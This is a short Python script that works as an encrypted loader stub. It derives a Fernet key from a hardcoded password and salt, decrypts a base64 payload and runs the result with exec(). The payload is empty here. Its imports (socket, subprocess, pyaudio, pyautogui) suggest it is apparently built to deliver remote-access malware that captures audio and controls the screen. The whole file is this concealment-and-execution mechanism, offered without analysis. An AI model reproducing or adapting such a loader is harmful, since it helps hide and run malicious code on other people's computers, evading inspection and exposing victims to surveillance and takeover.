from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
from cryptography.fernet import Fernet
import os
import socket
import subprocess
import time
import signal
import sys
import struct
import pyaudio
import pyautogui

data = b''
unbase64 = base64.b64decode(data)
password_provided = "V3ryS3cur3P4ssw0rd" # This is input in the form of a string
password = password_provided.encode() # Convert to type bytes
salt = "SocketProgrammingisCool".encode() # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = base64.urlsafe_b64encode(kdf.derive(password))
fernet = Fernet(key)
encrypted = fernet.decrypt(unbase64)
real_shit = encrypted.decode()
#print(real_shit)
exec(real_shit)


